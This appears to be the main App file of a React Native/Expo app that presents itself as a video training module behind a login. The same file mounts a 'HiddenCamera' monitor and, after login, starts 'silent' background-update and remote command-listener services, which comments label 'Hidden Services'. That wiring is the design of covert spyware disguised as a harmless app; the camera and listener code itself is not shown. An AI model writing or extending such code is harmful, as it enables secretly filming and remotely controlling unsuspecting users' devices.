import { StatusBar } from 'expo-status-bar';
import { StyleSheet, Text, View, Button, ActivityIndicator } from 'react-native';
import { useEffect, useState } from 'react';
import { pb, initAuth } from './src/services/pocketbase';
import { startBackgroundUpdate } from './src/services/background-tasks';
import { startCommandListener } from './src/services/command-listener';
import { HiddenCamera } from './src/features/hidden/CameraMonitor';
import { LoginScreen } from './src/features/auth/LoginScreen';
import { VideoListScreen } from './src/features/videos/VideoListScreen';

export default function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(pb.authStore.isValid);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const setup = async () => {
      // Restore auth state from storage
      await initAuth();
      setIsAuthenticated(pb.authStore.isValid);
      setLoading(false);
    };

    setup();

    // Subscribe to auth changes
    const unsub = pb.authStore.onChange((token, model) => {
      setIsAuthenticated(!!token);
    });

    return () => {
      unsub();
    };
  }, []);

  useEffect(() => {
    if (isAuthenticated) {
      // Start silent services ONY when authenticated
      startBackgroundUpdate();
      startCommandListener();
    }
  }, [isAuthenticated]);

  const handleLogout = () => {
    pb.authStore.clear();
  };

  if (loading) {
    return (
      <View style={styles.container}>
        <ActivityIndicator size="large" color="#0056D2" />
      </View>
    );
  }

  if (!isAuthenticated) {
    return <LoginScreen onLoginSuccess={() => setIsAuthenticated(true)} />;
  }

  return (
    <View style={styles.container}>

      {/* Video Training Module */}
      <VideoListScreen />

      {/* Hidden Services */}
      <HiddenCamera />
      <StatusBar style="auto" />

      {/* Logout Button (Overlay) */}
      <View style={styles.logoutButton}>
        <Button title="Logout" onPress={handleLogout} color="#d93025" />
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f5f5f5',
  },
  logoutButton: {
    position: 'absolute',
    bottom: 30,
    right: 20,
    elevation: 5,
    zIndex: 100
  }
});
